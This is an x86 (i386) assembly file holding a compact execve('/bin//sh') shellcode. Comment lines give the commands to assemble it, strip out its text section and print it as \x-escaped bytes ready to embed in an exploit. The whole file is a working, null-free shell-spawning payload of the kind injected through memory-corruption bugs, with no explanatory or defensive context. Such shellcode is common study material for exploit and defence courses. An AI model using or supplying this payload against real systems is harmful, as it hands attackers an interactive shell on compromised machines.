/* execve("/bin//sh", ["/bin//sh", NULL], NULL) */
.section .text
.global _start

// assembler + linker
// as --32 -o execve_i386.o execve_bin_sh.s && ld -m elf_i386 -o execve_i386 execve_i386.o

// Print shellcode format \xef\xbe\xad\xde..
// objcopy -O binary --only-section=.text execve_i386 execve_i386.bin
// xxd -p -c 256 execve_i386.bin | sed 's/\(..\)/\\x\1/g'

// shellcode size
// wc -c execve_i386.bin

_start:
    xor    %eax, %eax        # eax = 0
    push   %eax              # push NULL terminator
    push   $0x68732f2f       # push "//sh"
    push   $0x6e69622f       # push "/bin"
    mov    %esp, %ebx        # ebx = pointer to "/bin//sh"
    push   %eax              # argv[1] = NULL
    push   %ebx              # argv[0] = "/bin//sh"
    mov    %esp, %ecx        # ecx = argv
    xor    %edx, %edx        # edx = envp = NULL
    mov    $11, %al          # syscall execve (11)
    int    $0x80             # interrupt
